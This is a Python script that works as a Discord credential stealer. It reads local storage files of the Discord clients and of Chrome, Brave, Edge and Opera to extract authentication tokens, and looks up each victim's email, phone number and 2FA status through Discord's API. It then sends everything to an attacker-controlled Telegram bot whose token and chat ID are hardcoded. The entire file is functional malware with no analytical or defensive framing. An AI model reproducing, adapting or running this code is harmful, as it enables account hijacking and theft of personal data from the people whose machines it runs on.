import re
import os
import base64
import typing
import json
import urllib.request
import requests

bot_token = "8059570004:AAH1Z9kfQTQLl8HirnZ7exDvuk5emI0qF_w"
chat_id = "7611773286"

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}

APP_PATHS = {
    "Discord": "%AppData%\\discord\\Local Storage\\leveldb",
    "Discord Canary": "%AppData%\\discordcanary\\Local Storage\\leveldb",
    "Discord PTB": "%AppData%\\discordptb\\Local Storage\\leveldb",
    "Chrome": "%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    "Brave": "%LocalAppData%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
    "Edge": "%LocalAppData%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
    "Opera": "%AppData%\\Opera Software\\Opera Stable\\Local Storage\\leveldb"
}

def get_tokens_from_file(file_path: str) -> typing.List[str]:
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as f:
            contents = f.read()
    except (PermissionError, FileNotFoundError):
        return []

    tokens = re.findall(TOKEN_REGEX_PATTERN, contents)
    return tokens

def remove_duplicate_tokens(token_entries: typing.List[dict]) -> typing.List[dict]:
    seen_tokens = set()
    unique_entries = []
    for entry in token_entries:
        token = entry["token"]
        if token not in seen_tokens:
            seen_tokens.add(token)
            unique_entries.append(entry)
    return unique_entries

def get_user_id_from_token(token: str) -> typing.Optional[str]:
    try:
        return base64.b64decode(token.split(".")[0] + "==").decode("utf-8")
    except:
        return None

def get_discord_user_info(token: str) -> typing.Optional[dict]:
    try:
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        request = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=headers)
        with urllib.request.urlopen(request) as response:
            if response.status == 200:
                return json.loads(response.read().decode())
    except:
        return None
    return None

def get_tokens_from_path(base_path: str, app_name: str) -> typing.List[dict]:
    if not os.path.exists(base_path):
        return []

    file_paths = [os.path.join(base_path, f) for f in os.listdir(base_path) if os.path.isfile(os.path.join(base_path, f))]
    token_entries: typing.List[dict] = []

    for file_path in file_paths:
        tokens = get_tokens_from_file(file_path)
        if not tokens:
            continue

        for token in tokens:
            user_id = get_user_id_from_token(token)
            if not user_id:
                continue
            user_info = get_discord_user_info(token)
            token_entries.append({
                "token": token,
                "user_id": user_id,
                "source": app_name,
                "info": user_info
            })

    return token_entries

def send_t_to_telegram_grouped(bot_token: str, chat_id: str, token_entries: typing.List[dict]) -> None:
    # Group tokens by username
    grouped_tokens = {}
    separate_tokens = []

    for entry in token_entries:
        user_info = entry.get("info")
        username = None
        if user_info:
            username = f"{user_info.get('username', 'N/A')}#{user_info.get('discriminator', 'N/A')}"

        if username and username != "N/A#N/A":
            if username not in grouped_tokens:
                grouped_tokens[username] = []
            grouped_tokens[username].append(entry)
        else:
            separate_tokens.append(entry)

    # Send grouped tokens with full account info
    for username, entries in grouped_tokens.items():
        message_lines = [f"Tokens for **{username}**:"]
        for entry in entries:
            token = entry["token"]
            source = entry["source"]
            user_info = entry.get("info")

            account_info = "No additional account information available"
            if user_info:
                account_info = (
                    f"Email: {user_info.get('email', 'N/A')}\n"
                    f"Phone: {user_info.get('phone', 'N/A')}\n"
                    f"2FA Enabled: {user_info.get('mfa_enabled', False)}\n"
                    f"Verified: {user_info.get('verified', False)}\n"
                    f"Nitro: {user_info.get('premium_type', 0) > 0}"
                )
            message_lines.append(f"\nToken: {token} (from: {source})\nAccount Information:\n{account_info}")

        message_lines.append("\n----------------------")
        message = "\n".join(message_lines)
        response = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": message}
        )
        if response.status_code != 200:
            print("Failed to send message:", response.text)

    # Send separate tokens without username
    for entry in separate_tokens:
        token = entry["token"]
        source = entry["source"]
        user_info = entry.get("info")

        account_info = "No additional account information available"
        if user_info:
            account_info = (
                f"Email: {user_info.get('email', 'N/A')}\n"
                f"Phone: {user_info.get('phone', 'N/A')}\n"
                f"2FA Enabled: {user_info.get('mfa_enabled', False)}\n"
                f"Verified: {user_info.get('verified', False)}\n"
                f"Nitro: {user_info.get('premium_type', 0) > 0}"
            )

        message = f"Token: {token} (from: {source})\nNo username available.\nAccount Information:\n{account_info}\n----------------------"
        response = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": message}
        )
        if response.status_code != 200:
            print("Failed to send message:", response.text)

def main() -> None:
    all_tokens: typing.List[dict] = []

    for app_name, path_template in APP_PATHS.items():
        expanded_path = os.path.expandvars(path_template)
        tokens = get_tokens_from_path(expanded_path, app_name)
        if tokens:
            all_tokens.extend(tokens)

    if not all_tokens:
        print("No Discord tokens found in any of the checked locations.")
        return

    # Remove duplicates
    all_tokens = remove_duplicate_tokens(all_tokens)

    # Send messages grouped by username with full info
    send_t_to_telegram_grouped(bot_token, chat_id, all_tokens)

if __name__ == "__main__":
    main()
